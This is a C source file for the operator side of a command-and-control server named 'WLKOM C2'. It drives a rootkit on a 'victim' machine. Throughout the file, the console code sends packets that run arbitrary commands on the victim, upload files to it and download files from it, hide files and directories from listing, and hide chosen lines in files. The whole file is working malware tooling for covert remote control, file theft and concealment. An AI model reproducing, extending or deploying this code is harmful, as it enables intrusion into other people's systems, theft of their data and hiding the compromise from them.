#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/commands.h"
#include "../include/server.h"

#define MAX_ARGS 8
#define CMD_LINE_SIZE 1024

static char *read_file(const char *path, size_t *len)
{
    FILE *f;
    char *buf;
    size_t ret;

    f = fopen(path, "rb");
    if (!f)
        return NULL;
    fseek(f, 0, SEEK_END);
    *len = ftell(f);
    rewind(f);
    buf = malloc(*len);
    if (!buf)
    {
        fclose(f);
        return NULL;
    }
    ret = fread(buf, 1, *len, f);
    fclose(f);
    if (ret != *len)
    {
        free(buf);
        return NULL;
    }
    return buf;
}

static int write_file(const char *path, const char *buf, size_t len)
{
    FILE *f;

    f = fopen(path, "wb");
    if (!f)
        return -1;
    fwrite(buf, 1, len, f);
    fclose(f);
    return 0;
}

static void print_prompt(void)
{
    printf("\n\033[1;32mWLKOM C2\033[0m > ");
    fflush(stdout);
}

static void print_help(void)
{
    printf("\n"
           "  \033[1mAvailable commands:\033[0m\n"
           "  exec <cmd>           Execute cmd on victim\n"
           "  upload <local> <rem> Upload file to victim\n"
           "  download <rem> <loc> Download file from victim\n"
           "  hide_file <name>     Hide file/dir from ls\n"
           "  unhide_file <name>   Unhide file/dir\n"
           "  hide_line <f> <pat>  Hide lines in file\n"
           "  unhide_line <f><pat> Unhide lines\n"
           "  ping                 Ping rootkit\n"
           "  help                 Show this help\n"
           "  exit                 Disconnect\n"
           "\n");
}

static void dispatch_ping(client_t *c)
{
    uint8_t op;
    char *resp = NULL;
    uint32_t resp_len = 0;

    send_packet(c->fd, CMD_PING, NULL, 0);
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0 && op == CMD_PONG)
        printf("PONG\n");
    else
        printf("No response\n");
    free(resp);
}

static void dispatch_exec(client_t *c, char **args, int argc)
{
    char full[CMD_LINE_SIZE] = { 0 };
    uint8_t op;
    char *resp = NULL;
    uint32_t resp_len = 0;
    int i;

    if (argc < 2)
    {
        printf("Usage: exec <command>\n");
        return;
    }

    for (i = 1; i < argc; i++)
    {
        strncat(full, args[i], sizeof(full) - strlen(full) - 1);
        if (i < argc - 1)
            strncat(full, " ", sizeof(full) - strlen(full) - 1);
    }
    send_packet(c->fd, CMD_EXEC, full, strlen(full));
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
        printf("%.*s\n", (int)resp_len, resp ? resp : "");
    free(resp);
}

static void dispatch_upload(client_t *c, char **args, int argc)
{
    size_t file_len;
    size_t path_len;
    size_t total_len;
    char *file_data;
    char *payload;
    uint8_t op;
    char *resp = NULL;
    uint32_t resp_len = 0;

    if (argc < 3)
    {
        printf("Usage: upload <local_path> <remote_path>\n");
        return;
    }
    file_data = read_file(args[1], &file_len);
    if (!file_data)
    {
        printf("Cannot read local file: %s\n", args[1]);
        return;
    }
    path_len = strlen(args[2]) + 1;
    total_len = path_len + file_len;
    payload = malloc(total_len);
    if (!payload)
    {
        free(file_data);
        return;
    }
    memcpy(payload, args[2], path_len);
    memcpy(payload + path_len, file_data, file_len);
    free(file_data);
    send_packet(c->fd, CMD_UPLOAD, payload, total_len);
    free(payload);

    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
        printf("Upload: %s\n", resp ? resp : "?");
    free(resp);
}

static void dispatch_download(client_t *c, char **args, int argc)
{
    uint8_t op;
    char *resp = NULL;
    uint32_t resp_len = 0;

    if (argc < 3)
    {
        printf("Usage: download <remote_path> <local_path>\n");
        return;
    }
    send_packet(c->fd, CMD_DOWNLOAD, args[1], strlen(args[1]));
    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
    {
        if (resp && strncmp(resp, "FAIL", 4) != 0)
        {
            write_file(args[2], resp, resp_len);
            printf("Downloaded %u bytes → %s\n", resp_len, args[2]);
        }
        else
        {
            printf("Download failed\n");
        }
    }
    free(resp);
}

static void dispatch_hide_line(client_t *c, const char *cmd, char **args,
                               int argc)
{
    size_t flen;
    size_t plen;
    size_t total;
    char *payload;
    uint8_t opcode;

    if (argc < 3)
    {
        printf("Usage: %s <filepath> <pattern>\n", cmd);
        return;
    }

    if (strcmp(cmd, "hide_line") == 0)
        opcode = CMD_HIDE_LINE;
    else
        opcode = CMD_UNHIDE_LINE;

    flen = strlen(args[1]) + 1;
    plen = strlen(args[2]);
    total = flen + plen;
    payload = malloc(total);
    if (!payload)
        return;
    memcpy(payload, args[1], flen);
    memcpy(payload + flen, args[2], plen);
    send_packet(c->fd, opcode, payload, total);
    free(payload);
    printf("%s request sent\n", cmd);
}

static int dispatch(client_t *c, char *line)
{
    char *args[MAX_ARGS];
    int argc = 0;
    char *tok;
    const char *cmd;

    line[strcspn(line, "\n")] = '\0';

    if (strlen(line) == 0)
        return 0;

    tok = strtok(line, " ");
    while (tok && argc < MAX_ARGS)
    {
        args[argc++] = tok;
        tok = strtok(NULL, " ");
    }

    if (argc == 0)
        return 0;

    cmd = args[0];

    if (strcmp(cmd, "ping") == 0)
    {
        dispatch_ping(c);
        return 0;
    }

    if (strcmp(cmd, "exec") == 0)
    {
        dispatch_exec(c, args, argc);
        return 0;
    }

    if (strcmp(cmd, "upload") == 0)
    {
        dispatch_upload(c, args, argc);
        return 0;
    }

    if (strcmp(cmd, "download") == 0)
    {
        dispatch_download(c, args, argc);
        return 0;
    }

    if (strcmp(cmd, "hide_file") == 0)
    {
        if (argc < 2)
        {
            printf("Usage: hide_file <name>\n");
            return 0;
        }
        send_packet(c->fd, CMD_HIDE_FILE, args[1], strlen(args[1]));
        printf("Hide file request sent: %s\n", args[1]);
        return 0;
    }

    if (strcmp(cmd, "unhide_file") == 0)
    {
        if (argc < 2)
        {
            printf("Usage: unhide_file <name>\n");
            return 0;
        }
        send_packet(c->fd, CMD_UNHIDE_FILE, args[1], strlen(args[1]));
        printf("Unhide file request sent: %s\n", args[1]);
        return 0;
    }

    if (strcmp(cmd, "hide_line") == 0 || strcmp(cmd, "unhide_line") == 0)
    {
        dispatch_hide_line(c, cmd, args, argc);
        return 0;
    }

    if (strcmp(cmd, "help") == 0)
    {
        print_help();
        return 0;
    }

    if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0)
        return -1;

    printf("Unknown command: %s  (type 'help')\n", cmd);
    return 0;
}

void commands_loop(client_t *c)
{
    char line[CMD_LINE_SIZE];

    print_help();

    while (c->connected && c->authed)
    {
        print_prompt();

        if (!fgets(line, sizeof(line), stdin))
            break;

        if (dispatch(c, line) < 0)
            break;
    }
}
